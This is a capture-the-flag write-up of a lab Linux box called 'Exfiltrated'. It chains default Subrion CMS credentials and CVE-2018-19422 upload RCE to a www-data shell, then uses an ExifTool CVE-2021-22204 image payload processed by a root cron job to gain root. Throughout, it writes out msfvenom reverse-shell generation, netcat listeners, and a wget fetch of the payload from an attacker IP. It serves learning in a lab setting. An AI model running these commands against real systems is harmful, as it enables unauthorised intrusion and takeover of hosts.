<link rel="stylesheet" href="{{ '/assets/css/obsidian-dividers.css' | relative_url }}">

## Summary

<div class="divider divider-info">
    <span class="divider-title">TL;DR</span>
    <span class="divider-content">Exfiltrated is an Easy Linux box featuring a Subrion CMS installation vulnerable to authenticated RCE (CVE-2018-19422). After gaining initial access with default credentials, the privilege escalation path involves exploiting a cron job that processes images with a vulnerable version of ExifTool (CVE-2021-22204), allowing arbitrary command execution as root through malicious image metadata.</span>
</div>

**Key Vulnerabilities:**
- Subrion CMS with default credentials (admin:admin)
- Authenticated RCE in Subrion CMS (CVE-2018-19422)
- ExifTool arbitrary code execution (CVE-2021-22204)
- Cron job processing user-uploaded images with vulnerable ExifTool

---

## Enumeration

### Nmap Scan

**Initial scan:**
```bash
nmap -vv -T5 -p- 192.168.x.x

nmap -vv -T5 -p22,80 -sC -sV 192.168.x.x
```

**Results:**

| Port | Service | TCP/UDP |
| ---- | ------- | ------- |
| 22   | SSH     | TCP     |
| 80   | HTTP    | TCP     |

**Key findings:**
- Limited attack surface with only SSH and HTTP exposed
- Web application requires enumeration

---

### Web Enumeration

**Step 1:** Accessing the web application immediately reveals **Subrion CMS**


<div class="divider divider-info">
    <span class="divider-title">Subrion CMS</span>
    <span class="divider-content">Subrion is an open-source content management system built with PHP. Older versions contain multiple vulnerabilities including authenticated remote code execution through file upload and template manipulation.</span>
</div>


**Step 2:** Test default credentials
```
Username: admin
Password: admin
```

**Result:** ✅ Successfully authenticated with default credentials!

---

## Initial Foothold

### Vulnerability Discovery

**Vulnerability:** CVE-2018-19422 - Subrion CMS Authenticated RCE

<div class="divider divider-warning">
    <span class="divider-title">CVE-2018-19422</span>
    <span class="divider-content">An authenticated remote code execution vulnerability in Subrion CMS that allows attackers to upload malicious files or inject PHP code through template manipulation. Multiple exploitation methods exist, including file upload and eval() injection.</span>
</div>

---

### Exploitation Attempts

**Attempt 1:** Manual exploitation following [GitHub issue #909](https://github.com/intelliants/subrion/issues/909)

- Added `eval()` hook to `index.php`
- Successfully executed commands
- Method proved ineffective for obtaining full shell

**Attempt 2:** Various automated exploits

- Some exploits provided only pseudo-shells
- Escalation to interactive shell proved difficult
- Needed better exploitation method

**Attempt 3 (Success):** File upload RCE exploit

Found excellent [exploit by Drew-Alleman](https://github.com/Drew-Alleman/CVE-2018-19422) that supports file upload.

**Step 1:** Run the exploit to upload PHP reverse shell
```bash
# Generate PHP reverse shell
msfvenom -p php/reverse_php LHOST=10.10.14.5 LPORT=4444 -f raw > shell.php

# Use exploit to upload
python3 exploit.py --url http://192.168.x.x --user admin --pass admin --file shell.php
```

**Step 2:** Start listener and trigger shell
```bash
# Start listener
nc -lvnp 4444

# Access uploaded shell through browser
curl http://192.168.x.x/uploads/shell.php
```


<div class="divider divider-root">
    <span class="divider-title">Shell Access</span>
    <span class="divider-content">Successfully obtained reverse shell as www-data</span>
</div>

---

## Privilege Escalation

### Initial Enumeration Miss

**Critical mistake:** Failed to properly enumerate cron jobs during initial enumeration.

**The discovery:** Root cron job at `/etc/crontab`


<div class="divider divider-info">
    <span class="divider-title">Cron Job Analysis</span>
    <span class="divider-content">A cron job running as root processes image files from a specific directory using ExifTool. This is a common privilege escalation vector if the ExifTool version is vulnerable, as it processes user-controlled file metadata.</span>
</div>

---

### ExifTool Vulnerability

**Step 1:** Identify ExifTool version
```bash
exiftool -ver
```


**Step 2:** Research ExifTool vulnerabilities

Found **CVE-2021-22204** - ExifTool Arbitrary Code Execution


<div class="divider divider-warning">
    <span class="divider-title">CVE-2021-22204</span>
    <span class="divider-content">A critical vulnerability in ExifTool versions 7.44 through 12.23 that allows arbitrary code execution through malicious DjVu file metadata. When ExifTool processes a specially crafted image file, it executes embedded commands, leading to complete system compromise if run with elevated privileges.</span>
</div>

**Step 3:** Understand the exploit

The vulnerability works by:
1. Crafting a DjVu image file with malicious metadata
2. Embedding a reverse shell payload in the metadata
3. Uploading the file to a location processed by the cron job
4. ExifTool executes the payload when processing the file

---

### Exploitation

**Found PoC:** [CVE-2021-22204 ExifTool exploit](https://github.com/convisolabs/CVE-2021-22204-exiftool)

**Step 1:** Clone and prepare the exploit
```bash
git clone https://github.com/convisolabs/CVE-2021-22204-exiftool
cd CVE-2021-22204-exiftool
```

**Step 2:** Edit the exploit script to add reverse shell details


```python
# Modified exploit.py
LHOST = "10.10.14.5"
LPORT = "4445"
```

**Step 3:** Generate the malicious image
```bash
python3 exploit.py
```


This generates a file named `image.jpg` with the embedded payload.

**Note:** The payload isn't visible in the image itself - it's embedded in the metadata.


**Step 4:** Upload the malicious image to the target
```bash
# On target as www-data
cd /path/to/upload/directory
wget http://10.10.14.5:8000/image.jpg
```


**Step 5:** Start listener and wait for cron job
```bash
# Start listener
nc -lvnp 4445

# Wait for cron job to process the image (usually within a minute)
```

<div class="divider divider-root">
    <span class="divider-title">Root Access</span>
    <span class="divider-content">Successfully obtained root shell when cron job processed the malicious image</span>
</div>

---

## Post-Exploitation

**Flags:**
- User: Located in `/home/*/local.txt`
- Root: Located in `/root/proof.txt`

**Attack Chain Summary:**
1. Web enumeration reveals Subrion CMS
2. Default credentials provide authenticated access
3. CVE-2018-19422 exploited for file upload RCE
4. Initial shell obtained as www-data
5. Cron job enumeration reveals root process using ExifTool
6. ExifTool version identified as vulnerable to CVE-2021-22204
7. Malicious image crafted with embedded reverse shell
8. Image uploaded to directory processed by cron
9. ExifTool executes payload, providing root shell

**Key Lessons:**
- Always test default credentials (admin:admin, admin:password, etc.)
- Multiple exploitation methods exist for the same vulnerability - try different approaches
- Cron job enumeration is critical for privilege escalation
- Image processing tools (ExifTool, ImageMagick) are common privilege escalation vectors
- Metadata exploitation can bypass traditional file upload restrictions
- Some exploits require modification (IP/port) before use
- Patience is required for cron-based exploits (wait for scheduled execution)

---

## References

- [CVE-2018-19422 Exploit - GitHub](https://github.com/Drew-Alleman/CVE-2018-19422)
- [Subrion CMS Issue #909 - GitHub](https://github.com/intelliants/subrion/issues/909)
- [CVE-2021-22204 ExifTool Exploit - GitHub](https://github.com/convisolabs/CVE-2021-22204-exiftool)
- [CVE-2021-22204 Details - NVD](https://nvd.nist.gov/vuln/detail/CVE-2021-22204)
- [ExifTool - Official Site](https://exiftool.org/)
- [DjVu Format Documentation](http://djvu.sourceforge.net/)

---

## Timeline

```mermaid
graph LR
    A[Nmap Scan] --> B[Web Enum]
    B --> C[Subrion CMS]
    C --> D[Default Creds]
    D --> E[CVE-2018-19422]
    E --> F[File Upload RCE]
    F --> G[www-data Shell]
    G --> H[Cron Enum]
    H --> I[ExifTool Found]
    I --> J[CVE-2021-22204]
    J --> K[Malicious Image]
    K --> L[Root Shell]
```



---

**Pwned on:** 28/10/2025

**Difficulty Rating:** ⭐⭐⭐ (Requires understanding of metadata exploitation)  
**Fun Factor:** ⭐⭐⭐⭐ (Excellent learning experience with ExifTool CVE)
